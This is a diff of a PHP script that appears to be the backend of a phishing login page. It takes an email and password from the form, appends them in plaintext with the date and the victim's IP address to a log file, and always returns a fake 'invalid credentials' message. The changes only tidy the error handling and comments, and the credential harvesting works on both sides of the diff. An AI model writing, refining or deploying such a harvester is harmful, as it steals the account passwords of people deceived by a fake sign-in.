@@ -5,7 +5,7 @@ require_once 'email.php';
 $email = filter_input(INPUT_POST, 'di', FILTER_VALIDATE_EMAIL);
 $password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);
 
-// Define response function
+// Function to send JSON response
 function sendJsonResponse($success, $message = '', $redirectUrl = '') {
     header('Content-Type: application/json');
     echo json_encode([
@@ -18,33 +18,28 @@ function sendJsonResponse($success, $message = '', $redirectUrl = '') {
 
 // Validate email and password
 if (!empty($email) && !empty($password)) {
+    // Define log file path
+    $logFilePath = __DIR__ . '/logs/login_attempts.txt';
+
     try {
-        // Ensure logs folder exists
-        $logsFolder = __DIR__ . '/logs';
-        if (!is_dir($logsFolder)) {
-            $created = mkdir($logsFolder, 0755, true);
-            if (!$created) {
-                error_log("Failed to create logs folder: {$logsFolder}");
-                sendJsonResponse(false, "Unable to log information due to a server error.");
-            }
+        // Ensure the parent directory exists
+        if (!file_exists(__DIR__ . '/logs')) {
+            mkdir(__DIR__ . '/logs', 0755, true);
         }
 
-        // Save log data to file
-        $logFile = "{$logsFolder}/login_attempts.txt";
-        $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
-        if (file_put_contents($logFile, $logData, FILE_APPEND) === false) {
-            error_log("Failed to write log data to file: {$logFile}");
-            sendJsonResponse(false, "Unable to log information due to a server error.");
-        }
+        // Append login data to log file
+        $logContent = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
+        file_put_contents($logFilePath, $logContent, FILE_APPEND);
 
-        // Provide a generic failed login response
+        // Return a generic failure response
         sendJsonResponse(false, "Login failed. Invalid credentials.");
     } catch (Exception $e) {
-        error_log("Log write exception: " . $e->getMessage());
-        sendJsonResponse(false, "An error occurred while logging the attempt.");
+        // Handle exceptions by logging errors
+        error_log("Failed to write logs: " . $e->getMessage());
+        sendJsonResponse(false, "A server error occurred while handling your request.");
     }
 } else {
-    // Handle missing email or password
+    // Handle invalid inputs
     sendJsonResponse(false, "Email or Password missing.");
 }
 ?>
